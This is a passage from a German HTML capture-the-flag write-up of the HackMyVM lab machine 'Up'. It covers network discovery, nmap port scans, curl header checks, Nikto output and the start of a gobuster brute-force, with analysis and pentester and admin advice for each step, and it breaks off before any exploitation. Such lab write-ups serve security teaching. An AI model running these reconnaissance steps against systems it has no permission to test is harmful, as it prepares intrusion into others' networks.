@@ -1,1 +1,1135 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Up - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UP - HackMyVM - Easy - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>UP - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">recon_script.sh</div>
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">base64decode.org</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">wc</div>
+                <div class="tool-item">mp64</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">make</div>
+                <div class="tool-item">gcc</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die Zeilen `2245  X=$(./recon_script.sh jenk.nyx)` und `2246  echo $X` deuten auf die Ausführung eines benutzerdefinierten Skripts namens `recon_script.sh` hin, dem der Parameter `jenk.nyx` übergeben wird. Das Ergebnis der Skriptausführung wird in der Variablen `X` gespeichert und anschließend ausgegeben. Der Inhalt von `$X` wird hier nicht gezeigt, aber diese Zeilen stammen wahrscheinlich aus einer Shell-History und zeigen einen initialen, möglicherweise automatisierten Reconnaissance-Schritt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verwendung von benutzerdefinierten Skripten ist üblich, um wiederkehrende Reconnaissance-Aufgaben zu automatisieren. Ohne den Inhalt des Skripts oder die Ausgabe von `echo $X` zu kennen, ist eine detaillierte Bewertung schwierig. Es deutet jedoch auf einen strukturierten Ansatz hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn solche Skripte verwendet werden, ist es wichtig, deren Funktionsweise zu verstehen und sicherzustellen, dass sie die gewünschten Informationen zuverlässig sammeln. Die Ergebnisse sollten immer manuell überprüft und validiert werden.
+            <br><strong>Empfehlung (Admin):</strong> Automatisierte Reconnaissance durch Angreifer ist gängig. Systeme sollten so gehärtet sein, dass sie möglichst wenig unnötige Informationen preisgeben. Monitoring-Systeme können helfen, ungewöhnliche Scan-Aktivitäten zu erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre> 2245  X=$(./recon_script.sh jenk.nyx)
+ 2246  echo $X</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l | grep "PCS" | awk '{print $1}'` wird verwendet, um die IP-Adresse eines Ziels im lokalen Netzwerk zu finden. `arp-scan -l` sendet ARP-Anfragen an alle Geräte im lokalen Netzwerk. Die Ausgabe wird mit `grep "PCS"` gefiltert, um Geräte zu finden, deren Herstellerbezeichnung "PCS Systemtechnik" enthält (oft ein Hinweis auf Oracle VirtualBox VMs). `awk '{print $1}'` extrahiert die IP-Adresse. Das Ergebnis ist `192.168.2.172`.
+            Darunter folgt eine detailliertere `arp-scan`-Ausgabe ohne Filterung, die alle erkannten Geräte im Netzwerk mit ihren MAC-Adressen und Herstellerinformationen auflistet. Hier ist `192.168.2.172` ebenfalls mit der MAC `08:00:27:d9:cc:6b` und dem Hersteller "PCS Systemtechnik GmbH" zu sehen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ziel-IP `192.168.2.172` wurde erfolgreich identifiziert. Die detaillierte `arp-scan`-Ausgabe gibt einen guten Überblick über andere Geräte im selben Netzwerksegment, was für das Situationsbewusstsein nützlich sein kann, auch wenn diese nicht direkt angegriffen werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `arp-scan` ist ein schnelles und effektives Werkzeug für die Host-Discovery im LAN. Die Kombination mit `grep` und `awk` ist nützlich, um die Ausgabe auf relevante Informationen zu reduzieren.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung und NAC (Network Access Control) können helfen, unautorisierte Geräte im Netzwerk zu erkennen. Kenntnis der erwarteten Geräte im Netzwerk ist wichtig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre>192.168.2.172</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre> 
+:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
+ 
+
+Interface: eth0, type: EN10MB, MAC: 08:00:27:ee:49:a2, IPv4: 192.168.2.199
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="command">192.168.2.1	38:e1:f4:22:ac:ac	(Unknown)</span>
+<span class="command">192.168.2.30	8c:98:06:22:c3:49	SHENZHEN SEI ROBOTICS CO.,LTD</span>
+<span class="command">192.168.2.31	bc:f8:7e:ac:41:00	(Unknown)</span>
+<span class="command">192.168.2.32	80:47:86:96:f6:3a	Samsung Electronics Co.,Ltd</span>
+<span class="command">192.168.2.120	84:25:19:2f:66:32	Samsung Electronics</span>
+<span class="command">192.168.2.161	08:bf:b8:c1:fd:13	(Unknown)</span>
+<span class="command">192.168.2.172	08:00:27:d9:cc:6b	PCS Systemtechnik GmbH</span>
+<span class="command">192.168.2.188	04:42:1a:06:81:54	ASUSTek COMPUTER INC.</span>
+<span class="command">192.168.2.163	ae:ef:d4:a6:85:d3	(Unknown: locally administered)</span>
+<span class="command">192.168.2.111	ce:f4:81:80:c5:d4	(Unknown: locally administered)</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist ein Auszug aus der `/etc/hosts`-Datei des Angreifer-Systems. Sie enthält manuelle Zuordnungen von IP-Adressen zu Hostnamen. Der relevante Eintrag für diesen Bericht ist `192.168.2.172   up.hmv`, der der zuvor gefundenen IP-Adresse den Hostnamen `up.hmv` zuweist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Hinzufügen eines Eintrags zur `/etc/hosts`-Datei ist eine gängige Praxis, um das Zielsystem während des Pentests unter einem leicht merkbaren Namen anzusprechen. Dies vereinfacht die Verwendung von Tools, die Hostnamen erwarten oder wenn man virtuelle Hosts auf einem Webserver testen möchte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Es ist eine gute Vorgehensweise, die `/etc/hosts`-Datei zu pflegen, um die Arbeit zu erleichtern. Stellen Sie sicher, dass der gewählte Hostname nicht mit wichtigen realen Diensten kollidiert.
+            <br><strong>Empfehlung (Admin):</strong> In produktiven Umgebungen sollten DNS-Server für die Namensauflösung verwendet werden. Änderungen an lokalen Hosts-Dateien auf Endgeräten können auf unautorisierte Aktivitäten hindeuten, ihre Überwachung ist jedoch oft aufwendig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre> 
+:::::::::::::::::::::::::::::::::::::::::::::::::::::: /etc/hosts ::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+
+        #       192.168.2.161   dc2.vln dc-2
+                192.168.2.162   buster.hmv
+        #       192.168.2.163	dc1.vln
+                192.168.2.164   lookup.hmv www.lookup.hmv files.lookup.hmv
+                192.168.2.165   plpl.hmv
+                192.168.2.167   jan.hmv
+        #       192.168.2.166   dc6.vln wordy
+        #       192.168.2.168	sick.vln
+        #       192.168.2.169	sick.vln
+        #       192.168.2.170	sick.vln
+                192.168.2.171   hero.hmv hero
+                <span class="command">192.168.2.172   up.hmv</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Diese Befehlskette dient dazu, IPv6-Adressen im lokalen Netzwerk zu finden und mit Nmap zu scannen.
+            `cmd=$(ip neigh | grep ^fe80 2>/dev/null| grep -ve "fe80::1\|fe80::....:a4bf:d441")`: `ip neigh` zeigt den ARP/NDP-Cache. `grep ^fe80` filtert nach Link-Local-IPv6-Adressen. `2>/dev/null` unterdrückt Fehler. `grep -ve "..."` schließt bestimmte Adressen aus (wahrscheinlich das Gateway und eine andere bekannte Adresse). Das Ergebnis wird in `cmd` gespeichert.
+            `cmd2=$(echo $cmd |  awk '{print $1}' | sort -u)`: Extrahiert die reinen IPv6-Adressen aus `cmd`, sortiert sie und entfernt Duplikate.
+            `nmap $cmd2 -6`: Führt einen Nmap-Scan auf den gefundenen IPv6-Adressen durch. Die Option `-6` ist für IPv6-Scans.
+            Die Nmap-Ausgabe zeigt für `debian (fe80::a00:27ff:fed9:cc6b)` den Port <span class="command">80/tcp (http)</span> als offen. Die MAC-Adresse `08:00:27:D9:CC:6B` ist identisch mit der des IPv4-Ziels. Für eine andere IPv6-Adresse (`fe80::d0a5:97c8:ee04:6f55`) werden keine offenen Ports gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der IPv6-Scan bestätigt, dass der Webserver auch über IPv6 auf Port 80 erreichbar ist. Dies ist wichtig für ein vollständiges Bild der Angriffsfläche. Die Methode zur Ermittlung der IPv6-Nachbarn ist etwas umständlich, aber funktionell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Es ist wichtig, immer auch IPv6 zu berücksichtigen. Nmap-Optionen wie `-6` sind dafür unerlässlich. Die Ausgabe des Scans ist die Grundlage für weitere Enumerationsschritte auf dem Webserver über IPv6, falls sich dieser anders verhält als über IPv4.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Firewall-Regeln und Dienstkonfigurationen sowohl für IPv4 als auch für IPv6 konsistent und sicher sind. Deaktivieren Sie IPv6 auf Schnittstellen und Systemen, wenn es nicht aktiv genutzt wird, um die Komplexität und Angriffsfläche zu reduzieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cmd=$(ip neigh | grep ^fe80 2>/dev/null| grep -ve "fe80::1\|fe80::....:a4bf:d441"); \</span></div>
+                    <div class="prompt"> <span class="command">cmd2=$(echo $cmd |  awk '{print $1}' | sort -u); \</span></div>
+                    <div class="prompt"> <span class="command">nmap $cmd2 -6;</span></div>
+                    <pre> 
+ ---------------- IPv6 Adresse: fe80::a00:27ff:fee2:95%eth0: ---------------
+ 
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 22:54 CET
+Nmap scan report for debian (<span class="command">fe80::a00:27ff:fed9:cc6b</span>)
+Host is up (0.00016s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+<span class="command">80/tcp open  http</span>
+MAC Address: <span class="command">08:00:27:D9:CC:6B</span> (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for <span class="command">fe80::d0a5:97c8:ee04:6f55</span>
+Host is up (0.0000060s latency).
+All 65535 scanned ports on fe80::d0a5:97c8:ee04:6f55 are in ignored states.
+Not shown: 65535 closed tcp ports (reset)
+
+Nmap done: 3 IP addresses (2 hosts up) scanned in 17.82 seconds</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap UDP-Scan wird durchgeführt.
+            `-sU`: UDP-Scan.
+            `--top-port 1000`: Scannt die 1000 häufigsten UDP-Ports.
+            `-T5`: Aggressives Timing ("insane").
+            `-n`: Keine DNS-Auflösung.
+            `$IP`: Variable, die die Ziel-IP (192.168.2.172) enthält.
+            `-Pn`: Überspringt die Host-Discovery (behandelt das Ziel als online).
+            `--min-rate 5000`: Sendet Pakete mit einer Mindestrate von 5000 pro Sekunde.
+            Die Ausgabe zeigt Port <span class="command">5353/udp</span> als `open` mit dem Dienst `zeroconf` (wahrscheinlich mDNS/Bonjour). Die anderen gescannten UDP-Ports sind `closed` oder `open|filtered` (keine Antwort).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> UDP-Scans sind oft langsam und unzuverlässig, da UDP ein verbindungsloses Protokoll ist. Ein offener Port 5353 (mDNS) ist in lokalen Netzwerken häufig anzutreffen und dient der Namensauflösung und Diensterkennung ohne zentralen DNS-Server. Er kann manchmal Informationen über das System oder andere Dienste preisgeben, ist aber selten ein direkter Angriffsvektor für Remote Code Execution.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der offene mDNS-Port könnte mit Tools wie `avahi-browse` oder spezifischen mDNS-Enumerationstools weiter untersucht werden, um zu sehen, welche Dienste das System im Netzwerk ankündigt. Meist ist dies für einen direkten Zugriff weniger relevant als TCP-Dienste.
+            <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie mDNS (Avahi-Daemon unter Linux, Bonjour unter macOS/Windows), wenn es im Netzwerk nicht benötigt wird, um die Angriffsfläche zu reduzieren und unnötigen Netzwerkverkehr zu vermeiden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sU --top-port 1000 -T5 -n $IP -Pn  --min-rate 5000</span></div>
+                    <pre>
+
+   Nmap UDP Scan  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 22:54 CET
+Nmap scan report for 192.168.2.172
+Host is up (0.00027s latency).
+Not shown: 993 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+===================================================
+<span class="command">5353/udp  open   zeroconf</span>      &lt;&lt;===&lt;-
+===================================================
+9103/udp  closed bacula-sd
+19047/udp closed unknown
+34358/udp closed unknown
+42557/udp closed unknown
+44179/udp closed unknown
+49196/udp closed unknown
+MAC Address: <span class="command">08:00:27:D9:CC:6B</span> (Oracle VirtualBox virtual NIC)</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Nmap-Befehl führt einen TCP SYN-Scan (`-sS`) mit Skript-Scanning (`-sC`), Versionserkennung (`-sV`) und OS-Erkennung/Traceroute (`-A` implies `-O` für OS detection) auf allen Ports (`-p-`) durch. Die Ausgabe wird direkt mit `grep open` gefiltert.
+            Das Ergebnis ist <span class="command">80/tcp open http Apache httpd 2.4.62 ((Debian))</span>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine schnelle Methode, um nur die offenen TCP-Ports und deren grundlegende Dienstinformationen aus einem umfassenden Nmap-Scan zu extrahieren. Es bestätigt, dass Port 80 der einzige offene TCP-Port ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `grep open`-Methode ist nützlich für eine schnelle Übersicht. Für detaillierte Analysen sollte jedoch die vollständige Nmap-Ausgabe betrachtet werden (wie im nächsten Befehl).
+            <br><strong>Empfehlung (Admin):</strong> Regelmäßige Überprüfung der offenen Ports ist entscheidend. Stellen Sie sicher, dass keine unerwarteten Dienste lauschen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- $IP -Pn  --min-rate 5000 | grep open</span></div>
+                    <pre>  
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Debian))</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist der vollständige Nmap-Scan, dessen gefilterte Ausgabe im vorherigen Schritt gezeigt wurde.
+            Optionen:
+            `-sS`: TCP SYN-Scan.
+            `-sC`: Default-Skripte.
+            `-sV`: Versionserkennung.
+            `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute. (Beinhaltet `-O` für OS detection, nicht `-AO` als separate Option).
+            `-p-`: Alle TCP-Ports.
+            `$IP`: Ziel-IP.
+            `-Pn`: Host als online behandeln.
+            `--min-rate 5000`: Aggressive Scan-Rate.
+            Die Ausgabe bestätigt Port <span class="command">80/tcp (http)</span> mit <span class="command">Apache httpd 2.4.62 ((Debian))</span>. Der Seitentitel ist <span class="command">"RodGar - Subir Imagen"</span> (RodGar - Bild hochladen). Betriebssystemdetails deuten auf Linux hin. Traceroute zeigt einen direkten Hop.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Nmap-Scan liefert detaillierte Informationen über den einzigen offenen TCP-Port. Der Titel "Subir Imagen" (Bild hochladen) ist ein sehr starker Hinweis auf die Funktionalität der Webseite und ein potenzielles Angriffsziel (Dateiupload-Schwachstellen). Die Apache-Version und OS-Details sind nützlich für die weitere Recherche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Fokus sollte nun auf der Webanwendung auf Port 80 liegen, insbesondere auf der Upload-Funktionalität. Untersuchen Sie diese auf mögliche Schwachstellen (Umgehung von Dateityp-Filtern, Directory Traversal, Ausführung von hochgeladenem Code).
+            <br><strong>Empfehlung (Admin):</strong> Halten Sie Webserver-Software und das Betriebssystem aktuell. Dateiupload-Funktionen müssen besonders sorgfältig implementiert und abgesichert werden (strikte Typ- und Inhaltsvalidierung, Speicherung außerhalb des Web-Roots, keine Ausführungsrechte für Upload-Verzeichnisse).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn  --min-rate 5000</span></div>
+                    <pre> 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 22:54 CET
+Nmap scan report for up.hmv (192.168.2.172)
+Host is up (0.00031s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Debian))</span>
+|_http-title: <span class="command">RodGar - Subir Imagen</span>
+|_http-server-header: <span class="command">Apache/2.4.62 (Debian)</span>
+MAC Address: <span class="command">08:00:27:D9:CC:6B</span> (Oracle VirtualBox virtual NIC)
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.31 ms up.hmv (192.168.2.172)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap SCTP INIT-Scan (`-sY`) wird auf allen Ports (`-p-`) des Ziels durchgeführt.
+            SCTP (Stream Control Transmission Protocol) ist ein weiteres Transportprotokoll ähnlich TCP und UDP.
+            Die Ausgabe zeigt: "All 65535 scanned ports on 192.168.2.172 are in ignored states. Not shown: 65504 filtered sctp ports (no-response), 31 filtered sctp ports (proto-unreach)".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SCTP-Scan hat keine offenen SCTP-Ports gefunden. Die meisten Ports antworten nicht (`filtered`) oder signalisieren, dass das Protokoll nicht unterstützt wird (`proto-unreach`). SCTP wird seltener verwendet als TCP oder UDP, aber es ist gut, es für ein vollständiges Bild zu scannen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> In den meisten Fällen wird SCTP keine Angriffsvektoren bieten, es sei denn, es handelt sich um spezialisierte Telekommunikationssysteme oder ähnliches. Für typische Web-/Anwendungsserver ist es unwahrscheinlich, offene SCTP-Dienste zu finden.
+            <br><strong>Empfehlung (Admin):</strong> Wenn SCTP nicht benötigt wird, stellen Sie sicher, dass es auf Systemebene deaktiviert ist oder von der Firewall blockiert wird, um die Angriffsfläche minimal zu halten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sY -n -p- $IP -Pn  --min-rate 5000</span></div>
+                    <pre> 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 22:54 CET
+Nmap scan report for 192.168.2.172
+Host is up (0.00012s latency).
+All 65535 scanned ports on 192.168.2.172 are in ignored states.
+Not shown: 65504 filtered sctp ports (no-response), 31 filtered sctp ports (proto-unreach)
+MAC Address: <span class="command">08:00:27:D9:CC:6B</span> (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `curl -Iv http://$IP` sendet eine HTTP HEAD-Anfrage an den Webserver. `-I` für HEAD-Request, `-v` für verbose Output.
+            Die Antwort-Header bestätigen:
+            Status: <span class="command">HTTP/1.1 200 OK</span>.
+            Server: <span class="command">Apache/2.4.62 (Debian)</span>.
+            `Content-Type: text/html; charset=UTF-8`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl bestätigt die Erreichbarkeit des Webservers und liefert grundlegende Header. Die Informationen sind konsistent mit den vorherigen Nmap-Ergebnissen. Keine neuen kritischen Informationen, aber eine schnelle Bestätigung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Curl ist nützlich für schnelle manuelle HTTP-Anfragen und das Überprüfen von Headern. Für eine tiefere Web-Enumeration sind Tools wie Nikto, Gobuster oder Burp Suite besser geeignet.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Server-Header und stellen Sie sicher, dass keine unnötigen Informationen preisgegeben werden (z.B. zu detaillierte Server-Versionen, obwohl Apache hier Standardinformationen liefert).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://$IP</span></div>
+                    <pre> 
+*   Trying 192.168.2.172:80...
+* <span class="password">Connected to 192.168.2.172 (192.168.2.172) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.172
+&gt; User-Agent: curl/8.10.1
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; Date: Sun, 09 Feb 2025 21:55:13 GMT
+Date: Sun, 09 Feb 2025 21:55:13 GMT
+&lt; Server: <span class="command">Apache/2.4.62 (Debian)</span>
+Server: Apache/2.4.62 (Debian)
+&lt; Content-Type: <span class="command">text/html; charset=UTF-8</span>
+Content-Type: text/html; charset=UTF-8
+&lt; 
+
+* Connection #0 to host 192.168.2.172 left intact</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `curl --verbose -I http://$IP -s` führt ebenfalls eine HTTP HEAD-Anfrage durch.
+            `--verbose`: Ähnlich zu `-v`, gibt detaillierte Informationen aus.
+            `-I`: HEAD-Request.
+            `-s`: Silent-Modus, unterdrückt den Fortschrittsbalken, aber nicht die Header-Ausgabe mit `--verbose` oder `-I`.
+            Die Ausgabe ist identisch mit dem vorherigen `curl -Iv`-Befehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl liefert dieselben Informationen wie der vorherige. Die Verwendung von `-s` ist hier redundant, da `-I` oder `-v` bereits die gewünschten Header-Informationen anzeigen. Wiederholung ohne neue Erkenntnisse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vermeiden Sie redundante Befehle, wenn die Informationen bereits vorliegen, es sei denn, Sie testen spezifische Serverreaktionen auf leicht geänderte Anfragen.
+            <br><strong>Empfehlung (Admin):</strong> Konsistenz in den Serverantworten ist gut. Stellen Sie sicher, dass alle Endpunkte die erwarteten und sicheren Header liefern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --verbose -I http://$IP -s</span></div>
+                    <pre>
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+::::::::::::::::::::::::: HTTP-Header Verbose Scan :::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+*   Trying 192.168.2.172:80...
+* <span class="password">Connected to 192.168.2.172 (192.168.2.172) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.172
+&gt; User-Agent: curl/8.10.1
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; Date: Sun, 09 Feb 2025 21:55:13 GMT
+Date: Sun, 09 Feb 2025 21:55:13 GMT
+&lt; Server: <span class="command">Apache/2.4.62 (Debian)</span>
+Server: Apache/2.4.62 (Debian)
+&lt; Content-Type: <span class="command">text/html; charset=UTF-8</span>
+Content-Type: text/html; charset=UTF-8
+&lt; 
+
+* Connection #0 to host 192.168.2.172 left intact</pre>
+                </div>
+            </div>
+        </section>
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die Ausgabe von Nikto (Version 2.5.0) für das Ziel `192.168.2.172` auf Port 80 wird gezeigt.
+            Wichtige Funde:
+            Server: <span class="command">Apache/2.4.62 (Debian)</span>.
+            Fehlender `X-Frame-Options`-Header: Potenzielles Clickjacking-Risiko.
+            Fehlender `X-Content-Type-Options`-Header: Könnte MIME-Type-Sniffing durch Browser ermöglichen.
+            "Web Server returns a valid response with junk HTTP methods": Der Server antwortet auf ungültige HTTP-Methoden mit einem validen Response-Code, was False Positives bei Scannern verursachen kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto identifiziert gängige, aber meist geringfügige Sicherheitsmängel bezüglich fehlender HTTP-Security-Header. Die Information über die Reaktion auf "Junk HTTP Methods" ist nützlich, da sie erklärt, warum manche Tools möglicherweise unerwartete Ergebnisse liefern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die fehlenden Header sollten im Bericht erwähnt werden. Untersuchen Sie, ob die Reaktion auf ungültige HTTP-Methoden weitere Informationen preisgibt oder für Angriffe ausgenutzt werden kann (selten, aber möglich).
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie wichtige Security-Header wie `X-Frame-Options: DENY` (oder `SAMEORIGIN`), `X-Content-Type-Options: nosniff` und `Content-Security-Policy`, um die Sicherheit der Webanwendung zu verbessern. Konfigurieren Sie den Webserver so, dass er auf unbekannte oder ungültige HTTP-Methoden mit einem entsprechenden Fehlercode (z.B. 405 Method Not Allowed oder 501 Not Implemented) reagiert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>======================================================================================================
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.172</span>
++ Target Hostname:    <span class="command">192.168.2.172</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         2025-02-09 22:55:17 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.62 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: <span class="password">Web Server returns a valid response with junk HTTP methods</span> which may cause false positives.
++ <span class="command">8102 requests: 0 error(s) and 3 item(s) reported on remote host</span>
++ End Time:           2025-02-09 22:56:12 (GMT1) (55 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+======================================================================================================</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird für das Directory/File-Bruteforcing verwendet.
+            `dir`: Directory/File-Enumeration-Modus.
+            `-u "http://$IP"`: Ziel-URL.
+            `-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Wortliste.
+            `-x txt,php,...,json,conf,ELF,...,js.map,pHtml`: Eine sehr lange Liste von Dateierweiterungen, nach denen gesucht wird.
